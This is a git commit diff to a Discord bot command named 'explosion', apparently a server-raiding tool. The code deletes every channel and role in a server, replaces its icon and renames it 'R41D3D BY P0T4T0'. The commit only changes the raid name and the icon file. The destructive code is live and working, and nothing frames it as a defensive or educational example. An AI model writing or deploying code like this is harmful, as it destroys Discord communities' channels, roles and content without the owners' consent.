a7f4d0443560643779b29b0fac77cb5a4e7e186b
OMGIsPerry <38996133+OMGIsPerry@users.noreply.github.com>
2020-05-09 12:47:32 +0800

    yee

--- commands/explosion.js
+++ commands/explosion.js
@@ -2,10 +2,10 @@ module.exports = {
 	name: 'explosion',
 	description: 'explosion',
 	execute(message, args){
-		const guildName = "awa R41D3D BY S0M30N3"
+		const guildName = "R41D3D BY P0T4T0";
 		message.guild.channels.forEach(channel => channel.delete())
 		message.guild.roles.forEach(role => role.delete())
-		message.guild.setIcon("./res/aquaicon.png")
+		message.guild.setIcon("./res/eaton.png")
 		message.guild.setName(guildName)
     }
 }
